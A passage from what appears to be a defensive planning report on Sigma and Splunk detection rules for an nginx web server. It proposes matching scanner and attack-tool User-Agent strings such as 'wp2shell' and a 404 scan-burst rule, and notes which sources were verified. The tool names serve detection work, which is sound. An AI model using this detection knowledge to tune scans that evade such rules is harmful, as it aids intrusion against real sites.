3. **Item 3, scanner / attack-tool User-Agents.** The simplest possible rule, so it proves the full nginx-to-Sigma-to-Splunk field mapping (`useragent`) cheaply, and it can include the 2026 `libredtail-http` and `wp2shell` strings so it is not just a copy of the old list.

Natural fourth (your first correlation rule): item 6, the 404 scan burst. It reuses the same test requests and the low-traffic baseline makes its threshold easy to demonstrate.

## Method notes and confidence

- Verified directly: CISA KEV entries (from the CISA KEV JSON feed, catalog 2026.09.18, plus the 2026-08-18 and 2026-09-11 alert pages), ATT&CK technique names/tactics (attack.mitre.org pages), Sigma and ET rule contents (fetched from the SigmaHQ repo and the ET open ruleset), and the GreyNoise, SANS ISC, CISA AA24-016A and SL Cyber pages cited above.
- Weaker: WordPress brute-force and webshell-filename lists rest on general write-ups, not a primary vendor report; the item 10 volumes are qualitative; the Splunk Security Content detections were identified by filename only.
- Sigma "no community rule found" statements come from a listing of the SigmaHQ repo tree and GitHub code search on 2026-09-20; that search can be incomplete, so a quick manual look before writing is still sensible.
- Not confirmed: what status nginx returns on Ubuntu 24.04 for beyond-root traversal (400 vs 404); check once and record it.
